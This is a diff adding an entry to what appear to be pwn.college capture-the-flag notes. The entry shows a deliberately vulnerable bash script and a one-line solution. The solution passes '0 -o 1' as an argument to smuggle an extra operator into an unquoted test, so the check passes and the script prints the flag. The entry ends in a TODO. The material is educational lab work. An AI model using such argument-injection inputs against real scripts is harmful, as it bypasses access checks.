@@ -130,3 +130,24 @@ echo "Goodbye!"
 /challenge/run "*"
 ```
 '*' is a wildcard, expanding to any possible string
+
+# Saga of the Sneaky Similarity
+
+### chall
+
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+CHALLENGE=$RANDOM$RANDOM$RANDOM
+
+[ -n "$1" ] || exit 1
+[ $1 -eq "$CHALLENGE" ] && cat /flag
+echo "Goodbye!"
+```
+
+### exploit
+```sh
+/challenge/run "0 -o 1"
+```
+TODO
